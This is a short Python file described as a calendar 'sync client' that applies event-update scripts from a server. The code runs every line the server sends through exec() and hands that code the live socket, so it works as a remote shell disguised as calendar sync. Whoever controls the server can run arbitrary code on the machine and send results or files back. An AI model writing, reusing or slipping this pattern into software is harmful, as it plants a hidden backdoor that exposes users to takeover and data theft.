"""Sync client.

Connects to the user's calendar server and applies the event-update
scripts it pushes. The server decides which updates to send; the client
applies them in arrival order until the server closes the connection.

Protocol:
    client -> server : "HELLO calendar-sync/1.2"
    server -> client : one update script per line
"""

import socket

PROTOCOL = "calendar-sync/1.2"
TIMEOUT = 10


def connect(host, port):
    sock = socket.create_connection((host, port), timeout=TIMEOUT)
    sock.settimeout(None)  # updates may arrive slowly
    return sock


def handshake(sock):
    f = sock.makefile("rw")
    f.write("HELLO %s\n" % PROTOCOL)
    f.flush()
    return f


def apply_update(script, ctx):
    """Apply one pushed event-update script.

    The update context carries the live sync socket so update scripts
    can report results back to the server.
    """
    exec(script, ctx)


def run(host, port):
    sock = connect(host, port)
    f = handshake(sock)
    ctx = {"sock": sock}
    try:
        for line in f:
            if line.strip():
                apply_update(line, ctx)
    except (OSError, EOFError):
        pass
    finally:
        sock.close()
